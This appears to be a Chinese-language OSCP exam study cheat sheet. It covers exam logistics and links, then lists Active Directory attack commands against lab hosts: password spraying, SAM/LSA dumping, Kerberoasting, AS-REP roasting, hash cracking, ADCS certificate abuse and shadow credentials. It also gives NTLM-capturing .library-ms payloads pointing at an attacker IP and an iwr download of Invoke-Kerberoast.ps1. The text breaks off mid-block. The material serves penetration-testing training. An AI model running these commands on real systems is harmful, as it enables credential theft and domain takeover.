# OSCP Exam

[reddit论坛](https://www.reddit.com/search/?q=oscp)

[靶机推荐](https://docs.google.com/spreadsheets/u/0/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1)

[oscp-certification](https://oscp-certification.certs-study.com/)

[MichalSzalkowski](http://michalszalkowski.com/security/)

```
oscp考试指南：
https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide

常见考试VPN问题：
https://help.offsec.com/hc/en-us/articles/360046293832-Common-VPN-and-Machine-VM-Issues

常见考试问题：
https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ

考试报告要求：
https://help.offsec.com/hc/en-us/articles/360046787731-PEN-200-Reporting-Requirements

离线视频列表：
https://help.offsec.com/hc/en-us/articles/22494486684436-PEN-200-Offline-Video-Mapping

监考工具手册：
https://help.offsec.com/hc/en-us/articles/360050299352-Proctoring-Tool-Manual

考试实时技术交流：
https://chat.offsec.com/
https://help.offsec.com/hc/en-us/articles/16780228284948-Exam-Support-Chat-with-OffSec-Technical-Support-Team
```

考试准备

```
OSID: your id

提前15分钟连接在线监考软件
https://proctoring.offensive-security.com/student/login
账号：osid
密码：hash for email

在kali下载troubleshooting.7z
wget https://www.offensive-security.com/support/troubleshooting.7z
7z x troubleshooting.7z
sudo ./troubleshooting.sh
```

考试注意事项

```
1、考试网络差记得修改vpn网口的mtu值。
sudo ifconfig tun0 mtu 1250
sudo ip l s dev tun0 mtu 700

2、可以每拿下一台靶机就快照一次，或者每4-6小时快照一次，尤其在关键节点上一定要快照，注意不能快照太多次，写笔记不方便，另外kali虚拟机挂起即可，千万别关机!!!

3、可确保您在 Kali 中使用 Google 的 DNS 服务器，一般不用。
sudo bash -c " echo nameserver 8.8.4.4 >> /etc/resolv.conf"

4、可确保即使在重新启动 Kali VM 或重新启动网络服务后，对 resolv.conf 文件的修改仍然存在。
sudo chattr +i /etc/resolv.conf
```



# OffSec

## 挑战offsec like靶场必看

[Offensive Security Cheatsheet](https://cheatsheet.haax.fr/)

[IT-Security](https://sushant747.gitbooks.io/total-oscp-guide/content/)

[S1ren](https://sirensecurity.io/blog/)

[S1ren-video](https://www.youtube.com/@sirensecurity)

[oscp-文件上传篇](https://publish.obsidian.md/d4rkc0de/oscp-tips/9998-find+init+access/3-uploadfuzz/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87)

[oscp-土豆提权](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/juicypotato.html)

[oscp-dotnetADtools](https://github.com/jakobfriedl/precompiled-binaries?tab=readme-ov-file)

[oscp-特权提权等工具](https://github.com/dxnboy/redteam/tree/master)

[windows特权提权思路](https://github.com/gtworek/Priv2Admin)

[git-commands](https://adfoster-r7.github.io/metasploit-framework/docs/development/get-started/git/git-cheatsheet.html)

[office-attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Office%20-%20Attacks.md)

**oscp-cheatsheet**

```
https://github.com/saisathvik1/OSCP-Cheatsheet
https://github.com/0xsyr0/OSCP
https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/
https://notchxor.github.io/oscp-notes/
https://github.com/BlessedRebuS/OSCP-Pentesting-Cheatsheet
https://hackwithmike.gitbook.io/oscp
```



# HackTheBox

## 挑战htb靶场必看

[ippsec-video](https://www.youtube.com/ippsec)

[S4viSinFiltro-video](https://www.youtube.com/@S4viSinFiltro)



# Active Directory

## 渗透Windows AD必看

[HIDEANDSEC](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory)

[黑客食谱](https://www.thehacker.recipes/)

[Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file)

[Pentest_ad_dark_2023_02](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg)

[官方推荐AD-cheat-sheet](https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg)

基础：https://snynr.medium.com/recovering-active-directory-91cf97d5c772



## 渗透独立域控常规步骤

### 已知域账号

#### NetExec

[NetExec](https://www.netexec.wiki/smb-protocol/enumeration)主要用于枚举和密码喷洒，进阶使用必须参考官网文档说明。

```
# 确认域账号是否能用，获取域名和域控主机名
netexec smb 10.129.189.93 -u 'alfred' -p 'basketball'

# 枚举计算机用户
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --computers

# 枚举域控共享资源，查看目录访问权限
netexec smb 10.129.192.165 -u 'henry' -p 'H3nry_987TGV!' --shares

# 通过smb协议枚举域用户
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users
netexec smb 10.129.189.93 -u ANSIBLE_DEV$ -H 1c37d00093dc2a5f25176bf2d474afdc --users

# 通过smb协议查看域用户部分信息
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users j.fleischman

# 通过smb协议枚举域组
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --groups

# 通过smb协议枚举域组domain admins成员
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --groups "domain admins"

# 通过smb协议进行对象rid爆破获取域内用户和组
netexec smb 10.129.192.165 -u 'henry' -p 'H3nry_987TGV!' --rid-brute

# 枚举域密码策略
netexec smb 10.129.189.93 -u 'alfred' -p 'basketball' --pass-pol

# 枚举当前活动会话
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --sessions

# 枚举已登陆用户
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --loggedon-users

# 枚举磁盘
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --disks

# 枚举sam hash
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --sam

# 枚举lsa进程secrets
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --lsa

# 尝试空登录
netexec smb 192.168.80.128 -u '' -p ''

# 尝试匿名登录
netexec smb 192.168.80.128 -u 'a' -p ''

# 尝试guest访客登录
netexec smb 192.168.80.128 -u 'guest' -p ''

# 多用户名和密码进行喷洒
netexec smb 10.10.11.69 -u 'j.fleischman' 'j.coffey' 'j.coffey' -p 'J0elTHEM4n1990!'
netexec smb 10.10.11.69 -u 'j.coffey' -p 'password' 'secret123' '1234567890'

# 用户名和密码字典进行喷洒（默认情况下，nxc 会在成功登录后退出。使用 --continue-on-success 标志，即使找到有效密码，它也会继续喷洒。）
nxc smb dc01.fluffy.htb -u ./domainusers.txt -p BAF-XVRpOno --continue-on-success
nxc smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt --continue-on-success

# 修改用户密码
nxc smb 10.129.189.93 -u sam -p Password123! -M change-password -o NEWPASS=NewP@ssword123

# 尝试空登录，主要应对非域控机器
netexec smb 192.168.80.128 -u '' -p '' --local-auth

# 尝试guest登录，主要应对非域控机器
netexec smb 192.168.80.128 -u 'guest' -p '' --local-auth

# 枚举本地组，主要应对非域控机器
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --local-groups

# 枚举 Bitlocker状态，主要应对非域控机器
netexec smb 192.168.80.128 -u 'guest' -p '' --local-auth -M bitlocker
```

#### SmbMap

```
# 枚举域控共享资源，查看目录访问权限
smbmap -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d fluffy.htb -H 10.10.11.69
```

#### Smbclient

```
# 直接进入域控共享目录IT。
smbclient -U fluffy.htb/j.fleischman%J0elTHEM4n1990! \\\\fluffy.htb\\IT

# 关注NETLOGON和SYSVOL目录，有时会出现敏感信息泄露。
smbclient -U "info%info" //192.168.237.40/NETLOGON
smbclient -U "info%info" //192.168.237.40/SYSVOL

# 如下Smbclient命令，用于递归下载文件和目录，使用这些命令前建议提前先在kali上创建个接收目录。
recurse on
prompt off
mget *
```

#### Enum4linux

```
# 枚举整个域内信息，时间会很长
enum4linux -a -u 'j.fleischman' -p 'J0elTHEM4n1990!' 10.10.11.69

# 建议重定向到文件中
enum4linux -u fmcsorley -p CrabSharkJellyfish192 -a 192.168.219.122 > enum4linux.txt
```

#### Enum4linux-ng

```
# 主要是通过RPC协议枚举一些用户Description字段值，内容也没有enum4linux多
enum4linux-ng -A -u 'j.fleischman' -p 'J0elTHEM4n1990!' 10.10.11.69
enum4linux-ng -A -u 'alfred' -p 'basketball' 10.129.189.93
```

#### Impacket-GetADUsers

```
# 枚举用户，以防遗漏！
GetADUsers.py -all -dc-ip 192.168.219.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
```

#### Rpcclient

```
# 尝试空密码登录
rpcclient -N -U fluffy/j.fleischman fluffy.htb

# 尝试hash登录
rpcclient -U fluffy/j.fleischman --pw-nt-hash '……' fluffy.htb

# 尝试域用户登录
rpcclient -U fluffy/j.fleischman%J0elTHEM4n1990! fluffy.htb
rpcclient -U tombwatcher/sam%Password123! tombwatcher.htb

# 尝试工作组登录，除非目标是域控
rpcclient -U j.fleischman%J0elTHEM4n1990! fluffy.htb

# 查看域用户p.agila的信息
rpcclient -U j.fleischman%J0elTHEM4n1990! --command 'queryuser p.agila' fluffy.htb

# 使用rpcclient命令枚举域用户
enumdomusers

# 使用rpcclient命令枚举域内环境中的windows特权
enumprivs

# 使用rpcclient命令查看指定用户的信息，有时候会有凭据泄露
queryuser j.fleischman

# 使用rpcclient命令创建域用户
createdomuser username

# 使用rpcclient命令修改域用户MOLLY.SMITH的密码
setuserinfo2 MOLLY.SMITH 23 'Password123!'

# 更多使用参考如下链接：
https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
```

#### Ldapsearch

```
# 查询域context，一般用于获取-b的值，例如DC=fluffy,DC=htb
ldapsearch -x -H ldap://10.129.116.183 -s base namingcontexts

# 使用简单认证，从DC=fluffy,DC=htb为基础开始枚举域内对象及其属性，输出非常多，另外一些属性值人类不可读
ldapsearch -x -H ldap://10.10.11.69 -D 'CN=Joel Fleischman,CN=Users,DC=fluffy,DC=htb' -w 'J0elTHEM4n1990!' -b 'DC=fluffy,DC=htb'

# 枚举域内所有对象
ldapsearch -x -H ldap://10.10.11.69 -D 'CN=Joel Fleischman,CN=Users,DC=fluffy,DC=htb' -w 'J0elTHEM4n1990!' -b 'DC=fluffy,DC=htb' 'objectClass=*'

# 枚举域内所有用户，其实objectClass=user就是过滤规则
ldapsearch -x -H ldap://10.10.11.69 -D 'CN=Joel Fleischman,CN=Users,DC=fluffy,DC=htb' -w 'J0elTHEM4n1990!' -b 'DC=fluffy,DC=htb' 'objectClass=user'

# 枚举域内所有组
ldapsearch -x -H ldap://10.10.11.69 -D 'CN=Joel Fleischman,CN=Users,DC=fluffy,DC=htb' -w 'J0elTHEM4n1990!' -b 'DC=fluffy,DC=htb' 'objectClass=group'

# 枚举域内所有的OU
ldapsearch -x -H ldap://10.129.116.183 -D 'CN=Henry,CN=Users,DC=tombwatcher,DC=htb' -w 'H3nry_987TGV!' -b 'DC=tombwatcher,DC=htb' "(objectClass=organizationalUnit)"
ldapsearch -x -H ldap://10.129.116.183 -D 'CN=Henry,CN=Users,DC=tombwatcher,DC=htb' -w 'H3nry_987TGV!' -b 'DC=tombwatcher,DC=htb' "(objectClass=organizationalUnit)" dn description

# 枚举OU中的所有对象；使用 -LLL 参数去除注释和版本信息
ldapsearch -LLL -x -H ldap://10.129.116.183 -D 'CN=Henry,CN=Users,DC=tombwatcher,DC=htb' -w 'H3nry_987TGV!' -b 'OU=ADCS,DC=tombwatcher,DC=htb' "(objectClass=*)"
ldapsearch -LLL -x -H ldap://10.129.116.183 -D 'CN=Henry,CN=Users,DC=tombwatcher,DC=htb' -w 'H3nry_987TGV!' -b 'OU=ADCS,DC=tombwatcher,DC=htb' "(objectClass=user)"

# 递归查询OU及其子OU
ldapsearch -LLL -x -H ldap://10.129.116.183 -D 'CN=Henry,CN=Users,DC=tombwatcher,DC=htb' -w 'H3nry_987TGV!' -b 'DC=tombwatcher,DC=htb' -s sub "(objectClass=organizationalUnit)"
```

#### Windapsearch

对ldap协议的理解和进阶查询还是得靠Ldapsearch！

```
# 通过ldap协议枚举域内计算机
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! -C

# 通过ldap协议枚举域内计算机对象的所有属性
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! -C --full

# 通过ldap协议枚举域用户
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! -U

# 通过ldap协议枚举域用户对象的所有属性(包括DN)，但属性值不一定人类可读，这一点还是bloodyAD好
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! -U --full

# 通过ldap协议枚举域组
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! -G

# 通过ldap协议枚举域组的成员
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! -m 'Service Accounts'

# 通过ldap协议枚举domain admins组的成员
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! --da

# 通过ldap协议枚举域内高权限用户
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! -PU

# 通过ldap协议枚举域内高权限对象
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! --admin-objects

# 通过ldap协议枚举域内spn对象，只显示DN
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! --user-spns

# 枚举gpo对象，查看gpc路径
python3 ./windapsearch.py -d dc01.fluffy.htb -u fluffy\\j.fleischman -p J0elTHEM4n1990! --gpo
```

#### BloodyAD

[bloodyAD](https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad)主要用于查看和修改对象属性，进阶使用必须参考[相关文档](https://ethicalhacksacademy.com/blogs/cyber-security-tools/bloodyad)说明。

详细使用说明：https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

```bash
# 查看用户对象属性
bloodyAD -d fluffy.htb --host 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' get object p.agila

# 修改用户密码
bloodyAD --host 10.129.116.183 -d tombwatcher.htb -u ansible_dev$ -p :1c37d00093dc2a5f25176bf2d474afdc set password sam 'Password123!'
bloodyAD --host 10.129.116.183 -d tombwatcher.htb -u sam -p Password123! set password john 'P@ssw0rd456!'

# 查看当前用户对哪些对象有写入权限
bloodyAD -d tombwatcher.htb --host 10.129.189.93 -u 'alfred' -p 'basketball' get writable

# 查看当前用户对可写对象的哪些属性有写入权限
bloodyAD -d fluffy.htb --host 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' get writable --detail 

# 修改对象属性值
bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE

# 枚举spn账户，可用于Kerberoasting攻击
bloodyAD -d fluffy.htb --host 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName | grep sAMAccountName | cut -d ' ' -f 2

# 枚举未启用Kerberos预身份验证的账户，可用于AS_REP Roasting攻击
bloodyAD -d fluffy.htb --host 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName

# 将用户添加到组
bloodyAD --host 10.129.116.183 -d tombwatcher.htb -u alfred -p basketball add groupMember "Infrastructure" alfred

# 查看可写的对象OU
bloodyAD --host 10.129.116.183 -d tombwatcher.htb -u john -p 'P@ssw0rd456!' get writable --otype ou
```

#### Kerbrute

使用Kerberos暴力破解Windows密码比任何其他方法都要快得多，并且可能更加隐蔽，因为预认证失败不会触发“传统”的4625登录失败事件。使用Kerberos，您可以通过仅向KDC(域控制器)发送一个UDP帧来验证用户名或测试登录。

```
# 密码喷洒
./kerbrute_linux_amd64 passwordspray -v -d fluffy.htb --dc dc01.fluffy.htb domain_users.txt 'J0elTHEM4n1990!'

# 暴力破解域用户，注意域密码策略
./kerbrute_linux_amd64 bruteuser -v -d fluffy.htb --dc dc01.fluffy.htb passwords.lst p.agila

# General bruteforce (from username:password wordlist or from stdin)
./kerbrute bruteforce -v -d ropnop.com --dc lab.ropnop.com userpass.txt
```

#### Bloodhound-python

```
# 使用bloodhound-python收集域内信息，输出一个zip，用于bloodhound-ce分析域内权限缺陷
bloodhound-python -d tombwatcher.htb -u 'alfred' -p 'basketball' -v --zip -c All -dc dc01.tombwatcher.htb --dns-tcp -ns 10.129.192.165

# 时间同步，有时候会同时使用udp和tcp端口，Kerberos验证需要与域控做时间同步
第一种方法：
sudo ntpdate dc01.fluffy.htb
第二种方法：
sudo timedatectl set-ntp off
sudo rdate -n dc01.tombwatcher.htb

# 使用Kerberos ticket票据认证代替密码认证，命令工具通常需要使用-k选项
export KRB5CCNAME=$path_to_ticket.ccache
关于票据传递参考如下链接:
https://www.thehacker.recipes/ad/movement/kerberos/ptt

# dns超时30秒
bloodhound-python -d resourced.local -u v.ventz -p 'HotelCalifornia194!' -ns 192.168.210.175 -c all --dns-timeout 30
```

#### Bloodhound-CE

注意最新版的kali 2025.2 已经集成Bloodhound-CE

密码：Xieyile127!@#

```
# 依靠bloodhound-cli启动docker容器
./bloodhound-cli containers start

# 注意使用如下命令可能会出现bug，例如8080端口消失
./bloodhound-cli resetpwd
```

Shortest Paths

```
# 从拥有的主体开始的最短路径
shortest path from owned principal

# 高价值目标的最短路径
Shortest Paths to High Value Targets
```

#### Impacket-GetUserSPNs

更多详细参考：https://tools.thehacker.recipes/impacket/examples/getuserspns.py

```
# 在整个域内环境识别SPN账户，请求Service Ticket，执行成功会返回TGS-REP Hash
impacket-GetUserSPNs fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.10.11.69 -request

# 指定单个SPN用户，请求Service Ticket
impacket-GetUserSPNs fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.10.11.69 -request-user ca_svc

# 指定要测试的SPN用户文件，请求Service Ticket
impacket-GetUserSPNs fluffy.htb/j.fleischman:J0elTHEM4n1990! -usersfile ./domainusers.txt -dc-ip 10.10.11.69

-save：将请求的 Service Ticket 以 .ccache 格式保存在磁盘上。对Pass the cache攻击很有用。此选项还会启用 -request。
-outputfile：将检索到的哈希值写入其中的文件名。如果未设置此选项，将打印值。
```

登录机器后，可利用Invoke-Kerberoast.ps1和Get-SPNs.ps1在Windows本地执行Kerberoasting攻击，详细参考[链接](https://www.cnblogs.com/kqdssheng/p/18891731#id3.2)。

```
# 执行Get-SPN.ps1，寻找SPN账户
.\Get-SPN.ps1

# 求票证并将其存储在内存中
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'

# 下载并执行Invoke-Kerberoast.ps1，获取SPN账户哈希值
powershell iwr http://192.168.45.154/Invoke-Kerberoast.ps1 -outfile Invoke-Kerberoast.ps1
.\Invoke-Kerberoast.ps1
```

#### Impacket-GetNPUsers

```
# 使用ldap认证，在域内查找没有开启Kerberos预身份验证用户
impacket-GetNPUsers -request -format hashcat -dc-ip 10.10.11.69 fluffy.htb/j.fleischman:J0elTHEM4n1990!

# 使用ldap认证，通过用户文件枚举哪些用户没有开启Kerberos预身份验证
impacket-GetNPUsers -usersfile ./domainusers.txt -request -format hashcat -dc-ip 10.10.11.69 fluffy.htb/j.fleischman:J0elTHEM4n1990!
```

#### Hashcat

hash类型示例：

https://hashcat.net/wiki/doku.php?id=example_hashes&source=post_page-----a9efaa755f6d---------------------------------------

```
# 破解Kerberoasting hash，-m的模式选择与etype的值有关，23对应的就是13100
hashcat -m 13100 ./ldap_svc.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# 破解AS-REP Roasting hash，除了使用rockyou.txt还可以尝试fastcrack.txt
hashcat -m 18200 ./hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# 破解NetNTLMv2 hash
hashcat -m 5600 -a 0 ./p.aglia.hash /usr/share/wordlists/rockyou.txt

# 破解NTLM hash
hashcat -m 1000 --force ca0f4f9e9eb8a092addf53bb03fc98c8 /usr/share/wordlists/rockyou.txt
```

#### Certipy-ad

在 Windows DC 上枚举 ADCS 始终是值得的，但建议使用最新版Certipy。

```bash
# 查找域用户JODIE.SUMMERS的证书模板漏洞
certipy-ad find -u JODIE.SUMMERS -p 'hHO_S9gff7ehXw' -dc-ip nara-security.com  -dns-tcp -ns 192.168.244.30 -bloodhound

# 为 Administrator 帐户重新提交证书
certipy-ad req -username JODIE.SUMMERS -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 192.168.244.30 -debug

# 尝试进行身份验证。如果命令报错参考链接：https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d。解决"域控制器没有为smart cards安装证书"问题的链接（当然主要是因为DC没有为PKINIT正确设置，导致身份验证将失败）：https://0xdf.gitlab.io/2023/12/09/htb-authority.html。
certipy-ad auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.244.30

evil-winrm -i 192.168.244.30 -u 'administrator' -H 'd35c4ae45bdd10a4e28ff529a2155745'
```

#### TargetedKerberoast

```
python3 targetedKerberoast.py -v -d tombwatcher.htb -u 'sam' -p 'Password123!'
```

### 未知域账号

#### ZeroLogon

Netlogon 在建立安全通道时使用的 **AES-CFB8 加密模式存在缺陷**，导致攻击者可以伪造全零的初始化向量（IV）和密钥，从而绕过身份验证。**攻击者可以将域控制器的计算机账户密码重置为空**（或任意值），以域控制器身份获取域管理员权限（完全控制域），存在可利用的[payload](https://github.com/risksense/zerologon)。

#### Impacket-lookupsid

```bash
# 以来宾用户的身份进行身份验证，枚举域用户。
impacket-lookupsid anonymous@nara-security.com
```

#### NetExec

```
# 来宾身份进行共享目录枚举、rid爆破
netexec smb 192.168.152.172 -u guest -p '' --shares
netexec smb 192.168.152.172 -u guest -p '' --rid-brute

# 空登录进行共享目录枚举、rid爆破
netexec smb 192.168.152.172 -u '' -p '' --shares
netexec smb 192.168.152.172 -u '' -p '' --rid-brute

# 匿名身份进行共享目录枚举、rid爆破
netexec smb 192.168.152.172 -u 'a' -p '' --shares
netexec smb 192.168.152.172 -u 'a' -p '' --rid-brute

# 匿名身份进行用户枚举，有时候用户的description会泄露凭据，请仔细检查！
netexec smb 192.168.152.172 --users

# 使用账户名作为密码测试域账户
netexec smb 192.168.237.40 -u ./domainusers.txt -p ./domainusers.txt

# 通过winrm协议测试用户hash
netexec winrm 192.168.167.175 -u users -H hashesh
```

#### Smbclient

```
# 尝试空登录，枚举共享目录
smbclient -N -U "" -L \\\\fluffy.htb

# 尝试匿名枚举共享目录
smbclient -L //fluffy.htb/.
```

#### Impacket-GetUserSPNs

```
# 尝试无凭据使用Impacket-GetUserSPNs抓取SPN账户Hash，域用户名可先随意伪造个none_svc
impacket-GetUserSPNs  -dc-ip 10.10.11.69 -request fluffy.htb/none_svc
```

#### Impacket-GetNPUsers

```
# 在RPC空会话下，通过用户文件枚举哪些用户没有开启Kerberos预身份验证
impacket-GetNPUsers -usersfile ./domainusers.txt -request -format hashcat -dc-ip 10.10.11.69 fluffy.htb/
```

#### Kerbrute

```
# 爆破88端口，枚举域用户
./kerbrute_linux_amd64 userenum -v -d vault.offsec --dc dc01.vault.offsec /usr/share/seclists/Usernames/Names/names.txt

# 使用不同的字典枚举域用户
kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.237.40 /opt/SecLists/Usernames/top-usernames-shortlist.txt
kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.208.40 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100
```

#### Rpcclient

```
# 尝试空登录
rpcclient -N -U "" vault.offsec

# 使用rpcclient命令查询服务器信息
srvinfo

# 使用rpcclient命令查询域用户，有时候Desc字段会泄露用户凭据，当然用户凭据会被"伪装"，需要仔细检查！
querydispinfo
```

#### Ldapsearch

```
# 如果重定向成功，将会产生大量数据，最好将其保存在命令行或文本编辑器中，并方便搜索。
ldapsearch -H ldap://192.168.152.172 -x -b"DC=vault,DC=offsec" > ldap_dump.txt

# 如果能未授权转储ldap数据，则可筛选出用户名。
cat ldap_dump.txt | grep -i "samaccountname"

# 有时候description会泄露凭据！
cat ldap_dump.txt | grep -i  "description"
```

#### Enum4linux

```
enum4linux -a -u '' -p '' 192.168.152.172
```

#### Enum4linux-ng

```
enum4linux-ng -A -u '' -p '' 192.168.152.172
```



# AutoRecon

OSCP考试必备工具，属于**kali自带工具**。

https://github.com/Tib3rius/AutoRecon

手动安装命令如下，

```bash
sudo apt install seclists curl dnsrecon enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb

pipx install git+https://github.com/Tib3rius/AutoRecon.git
```

sudo运行示例

```bash
sudo env "PATH=$PATH" autorecon [OPTIONS]
sudo $(which autorecon) [OPTIONS]
```



# SemiAutoRecon

OSCP考试必备工具

https://github.com/Tib3rius/SemiAutoRecon



# Threader3000

[Threader3000](https://github.com/dievus/threader3000) 是一个用 Python3 编写的脚本，允许多线程端口扫描。该程序是交互式的，只需要您运行它即可开始。启动后，系统会要求您输入 IP 地址或 FQDN，因为 Threader3000 会解析主机名。全端口扫描可能只需 15 秒，但最多应不到 1 分 30 秒，具体取决于您的互联网连接。



# Responder

一般用来监听目标的Netv2 Hash。

```bash
sudo responder -I tun0
```

强制 Responder 重新捕获哈希

```bash
sudo responder -I tun0 -f -v
```



# Impacket-smbserver

```bash
# 既可以用来充当smb服务器，也可以捕获hash。
impacket-smbserver -smb2support share .
```



# .library-ms

.library-ms文件可以用来窃取Netv2 Hash，一般和类似responder的工具配合使用。.library-ms文件除了直接上传到可写的共享目录，还可以将其打包成压缩包zip再上传。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.16.11\pwn</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Oscp官方教程提供.Library-ms的payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.207</url>   ###修改为kali
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```



# Shadow Credentials Attack 

影子凭据攻击需要配合证书传递攻击，具体参考：https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate

## Pywhisker

```bash
python3 pywhisker.py -d "dc01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "list"

python3 pywhisker.py -d "dc01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "info" --device-id dddc3174-f2fc-3b5e-7f4a-796a7c81c1ff

python3 pywhisker.py -d "dc01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "remove" --device-id dddc3174-f2fc-3b5e-7f4a-796a7c81c1ff

python3 pywhisker.py -d "dc01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "clear"

# 输出SCAfile.pfx、SCAfile_cert.pem、SCAfile_priv.pem文件和-pfx-pass密码
python3 pywhisker.py -d "dc01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add" --filename ca_svc
```

## PKINITtools

该工具非常依赖python3.5+，但是过高的python版本会导致运行失败，不建议使用！

```bash
# PFX 格式的示例

python3 PKINITtools/gettgtpkinit.py -cert-pfx SCAfile.pfx -pfx-pass 4YWAieAO3VZTLsfGLTAZ fluffy.htb/winrm_svc winrm_svc.ccache

python3 PKINITtools/getnthash.py -key f4d6738897808edd3868fa8c60f147366c41016df623de048d600d4e2f156aa9 fluffy.htb/winrm_svc


# PEM 格式的示例

python3 PKINITtools/gettgtpkinit.py -cert-pem SCAfile_cert.pem -key-pem SCAfile_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache

python3 PKINITtools/getnthash.py -key 894fde81fb7cf87963e4bda9e9e288536a0508a1553f15fdf24731731cecad16 fluffy.htb/winrm_svc
```

## Certipy

python虚拟环境部署Certipy最新版v5.0.2，注意kali有自带的Certipy工具名叫certipy-ad，版本为Certipy v4.8.2。注意使用Certipy v4.8.2可能不支持带密码保护的pfx证书，需要先解除保护，具体参考[链接](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate)。

```bash
python3 -m venv certipy
